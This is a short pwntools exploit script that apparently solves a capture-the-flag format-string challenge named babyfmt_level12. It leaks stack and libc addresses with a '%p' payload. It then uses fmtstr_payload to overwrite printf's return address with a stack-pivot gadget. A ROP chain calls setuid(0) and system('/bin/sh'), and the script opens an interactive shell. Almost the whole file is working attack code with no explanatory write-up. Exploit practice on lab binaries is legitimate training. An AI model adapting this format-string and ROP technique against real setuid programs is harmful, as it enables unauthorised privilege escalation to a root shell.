from pwn import *
context.binary = "/challenge/babyfmt_level12.0"
context.terminal = ['tmux','splitw','-h']
#p = gdb.debug("/challenge/babyfmt_level12.0")
p = process()
payload1 = '%p'*6 + '|%p|' + '%p'*4 + '.>%p'
print(payload1)
p.sendline(bytes(payload1,'utf-8'))
p.recvuntil(b'Your input is:')
p.recvline()
p.recvuntil(b'|')
leak_stack = int(p.recvuntil(b'|').strip(b'|').decode(),base=16) - 0xc7
p.recvuntil(b'.>')
leak_libc = int(p.recvline().strip(b'\n').decode(),base=16) - 0x20a4f8
log.info("Leak libc: %s", hex(leak_libc))
log.info("Leak stack: %s", hex(leak_stack))
add_rsp = leak_libc + 0xf9fcd #0x20ef1
pop_rdi = leak_libc + 0x1b6a
setuid = leak_libc + 0xc2150
bin_sh = leak_libc + 0x1925bd
system_func = leak_libc + 0x30290
pop_rbp = leak_libc + 0x6c0
overwrite = leak_stack + 424#0x1b8-0x8 #+ 0x1a0-0x8
leave_ret = leak_libc+ 0x358C8
ret = leak_libc + 0x358c9
p.recv()
payload2 = b'A'+fmtstr_payload(30,{leak_stack:add_rsp},128,no_dollars=True) #+ b'B' * 16 + b'C'* 16
payload2 += p64(pop_rdi) + p64(0) + p64(setuid) + p64(pop_rdi) + p64(bin_sh) + p64(system_func) #+ p64(0)
payload2 += cyclic(616-40) + p64(pop_rbp) + p64(overwrite) + p64(leave_ret)
#+ b'B'*16 + b'C'*16
p.sendline(payload2)
p.interactive()




#overwrite return address of printf: distance: 0xc7 from leak input
